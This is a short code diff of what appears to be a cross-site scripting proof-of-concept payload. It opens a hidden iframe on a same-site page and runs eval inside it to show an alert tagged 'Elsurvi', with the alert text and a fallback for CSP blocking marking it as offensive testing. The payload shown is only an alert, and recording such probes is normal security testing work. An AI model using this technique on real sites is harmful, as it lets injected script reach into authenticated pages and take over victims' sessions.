@@ -1,11 +1,13 @@
-var f = document.createElement('iframe');
-  f.style.display = 'none';
-  f.src = '/dashboard';
-  f.onload = function() {
+
+  let i = document.createElement('iframe');
+  i.src = '/DepartmentHome/pageContentDetails?Id=61&PId=658';
+  i.style.display = 'none';
+  i.onload = () => {
     try {
-      f.contentWindow.eval("alert('Elsurvi inside dashboard')");
-    } catch(e) {
-      console.log("Iframe access denied or CSP blocked:", e);
+      i.contentWindow.eval("alert('Elsurvi re-entry successful 🔥')");
+    } catch (e) {
+      console.log('Access blocked:', e.message);
     }
   };
-  document.body.appendChild(f);
+  document.body.appendChild(i);
+
